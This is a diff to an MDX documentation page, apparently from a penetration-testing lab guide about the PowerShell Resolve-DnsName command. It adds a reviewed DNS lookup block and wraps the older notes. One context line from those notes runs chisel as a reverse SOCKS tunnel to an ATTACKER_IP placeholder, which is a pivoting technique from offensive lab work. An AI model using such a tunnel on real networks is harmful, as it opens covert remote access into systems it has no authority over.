@@ -7,7 +7,37 @@ boost: 10
 hideFooterPagination: true
 ---
 
+import { PreservedNotes } from "/snippets/preserved-notes.jsx";
+
 {/* Generated from Commands/resolve-dnsname.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+**Review status:** Operation context reviewed on 2 November 2026. This is an editorial review, not a lab execution or a claim about an installed tool version.
+
+## Current operation: Ask the domain resolver for an address
+
+**Run in:** Windows PowerShell. **Requires:** Observed host FQDN and the resolver that serves the lab domain.
+
+```powershell
+Resolve-DnsName -Name HOST_FQDN -Server DC_IP -Type A
+```
+
+**Read the result:** Read the returned record type, answer and responding resolver; distinguish authoritative data from cached results.
+
+**If The default resolver answers differently:** An A record is not an SRV record, and a hostname resolving on one machine does not prove it resolves on your pivot.
+
+**Next check:** Record the returned address and resolver; use SRV queries separately when locating domain services.
+
+**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.
+
+### Reviewed operation documentation
+
+- [Primary reference 1](https://learn.microsoft.com/en-us/powershell/module/dnsclient/resolve-dnsname)
+
+## Preserved earlier notes
+
+<PreservedNotes>
+
+Earlier commands, explanations and worked examples are retained in full. Follow their stated platform, prompt and lab prerequisites.
 
 ## Resolve-DnsName: choose the operation and read the result
 
@@ -156,3 +186,5 @@ c:\tools\chisel.exe client <ATTACKER_IP>:8080 R:socks
 - [DNS Enumeration and Zone Transfers](/enumeration/dns-enumeration-domain-name-system)
 
 {/* VAULT_RELATED_END */}
+
+</PreservedNotes>
